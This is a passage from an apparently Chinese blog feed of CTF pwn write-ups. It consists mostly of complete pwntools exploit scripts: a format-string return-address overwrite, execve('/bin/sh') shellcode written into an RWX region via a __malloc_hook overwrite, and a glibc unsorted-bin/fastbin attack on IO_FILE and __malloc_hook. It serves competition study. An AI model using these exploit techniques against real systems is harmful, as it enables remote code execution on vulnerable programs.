class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span> , <span class="number">0x4f3c2</span> , <span class="number">0x10a45c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------stack----------------</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(<span class="number">83</span>)+<span class="string">'$p'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$p'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line">con=p.recv()</span><br><span class="line"></span><br><span class="line">leak=int(con[<span class="number">29</span>:<span class="number">41</span>],<span class="number">16</span>)</span><br><span class="line">libc.address=leak<span class="number">-0x21b97</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">leak=int(con[<span class="number">43</span>:<span class="number">55</span>],<span class="number">16</span>)</span><br><span class="line">main_addr=leak<span class="number">-0xe0</span></span><br><span class="line"></span><br><span class="line">rbp_addr=leak<span class="number">-0x200</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"main_addr"</span>,main_addr)</span><br><span class="line">info(<span class="string">"rbp_addr"</span>,rbp_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attack=(main_addr&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line">attack=(libc.address+one[<span class="number">1</span>]&amp;<span class="number">0xffff</span>)</span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line">attack=((main_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line">attack=(((libc.address+one[<span class="number">1</span>])&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line">attack=(rbp_addr&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"><span class="comment">#dbg(0x12B1)</span></span><br><span class="line"></span><br><span class="line">attack=<span class="number">0xc1</span></span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h2><p>先泄露出libc_addr，程序申请出了一段固定的可读可写可执行的区域，在里面先填充为shellcode，7功能里面可以溢出修改到<code>__malloc_hook</code>,修改为shellcode的地址即可得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"./oldschool"</span></span><br><span class="line">arch = <span class="string">'32'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'106.14.214.3'</span>, <span class="number">2333</span></span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment"># context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p=process(pwn_name)</span><br><span class="line">    <span class="comment"># p = process(["/glibc/2.23/64/lib/ld-2.23.so", "./pwn"], env=&#123;"LD_PRELOAD": "/glibc/2.23/64/lib/libc.so.6"&#125;)</span></span><br><span class="line">    <span class="comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(pwn_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func, libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con, leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con, leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0</span>:</span><br><span class="line">        gdb.attach(p,exe=<span class="string">"./oldschool"</span>)</span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script = <span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script = <span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        <span class="comment"># gdb.attach(p, script)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(address)</span>:</span></span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span><span class="params">(idx, val)</span>:</span></span><br><span class="line">    choice(<span class="number">7</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele2</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_me</span><span class="params">(address,string_me)</span>:</span></span><br><span class="line">    shellcode = string_me + <span class="string">b"\x00"</span> * <span class="number">4</span></span><br><span class="line">    shellcode = shellcode[<span class="number">0</span>:(len(shellcode) // <span class="number">4</span>) * <span class="number">4</span>]</span><br><span class="line">    print(shellcode)</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">0</span>, len(shellcode) , <span class="number">4</span>):</span><br><span class="line">        print(int.from_bytes(shellcode[item:item + <span class="number">4</span>], byteorder=<span class="string">'little'</span>, signed=<span class="keyword">True</span>))</span><br><span class="line">        print(hex(address+i),shellcode[item:item + <span class="number">4</span>])</span><br><span class="line">        edit2(address+i, int.from_bytes(shellcode[item:item + <span class="number">4</span>], byteorder=<span class="string">'little'</span>, signed=<span class="keyword">True</span>))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span><span class="params">(address)</span>:</span></span><br><span class="line">    index = (address - <span class="number">0xe0000000</span>) // <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"><span class="comment"># -------------stack----------------</span></span><br><span class="line"><span class="comment"># add(0, 0x68)</span></span><br><span class="line"><span class="comment"># add(1, 0x68)</span></span><br><span class="line"><span class="comment"># add(2, 0x68)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(0, 'a' * 0x68 + '\n')</span></span><br><span class="line">shellcode=<span class="string">b"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80"</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    add(item,<span class="number">0x90</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    free(item)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(item,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_info=p.recvuntil(<span class="string">"\x0a"</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">libc_addr=u32(libc_info[<span class="number">9</span>:<span class="number">9</span>+<span class="number">4</span>])<span class="number">-0x1d8828</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_me(<span class="number">0</span>,shellcode)<span class="comment">#写入shellcode</span></span><br><span class="line">print(hex(libc_addr+<span class="number">0x1d8788</span>))</span><br><span class="line"></span><br><span class="line">write_me(get_index(libc_addr+<span class="number">0x1d8788</span>),p32(<span class="number">0xe0000000</span>))<span class="comment">#malloc_hook</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><p>程序没有show功能，还限制了fastbin的大小，利用unsorted bin 攻击 global_max_fast，然后fastbin attack 打iofile，泄露libc_addr,再次fastbin attack打 <code>__malloc_hook</code>为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p=remote(<span class="string">'39.101.184.181'</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#p = process('./easypwn')</span></span><br><span class="line">elf = ELF(<span class="string">'./easypwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-easypwn.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd2</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendafter(<span class="string">"choice:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size:\n"</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,payload)</span>:</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">"content:\n"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"n"</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>+<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2--&gt;1</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">"n"</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>+<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#5--&gt;4</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#7</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p16(<span class="number">0x37f8</span><span class="number">-0x10</span><span class="number">-0x5</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">7</span>,p16(<span class="number">0x25dd</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,<span class="string">"11"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,<span class="string">"\x00"</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>))</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3c5600</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span>+hex(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">og = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">one = libc_base + og[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">cmd2(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">cmd2(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,<span class="string">"n"</span>*<span class="number">0x13</span>+p64(one))</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ctf真是秃头爆肝游戏，肝了两天出了六道pwn，pwn题真的太多了，做到不想做。&lt;/p&gt;
&lt;p&gt;最终48名，尽力了，没有进线下。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://nocbtm.github.io/imgs/ISEE3DP466
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020国赛线上赛 pwn wp</title>
    <link href="https://nocbtm.github.io/2020/08/22/2020%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn-wp/"/>
    <id>https://nocbtm.github.io/2020/08/22/2020国赛线上赛-pwn-wp/</id>
    <published>2020-08-22T11:24:30.000Z</published>
    <updated>2020-09-01T11:58:30.972Z</updated>
    
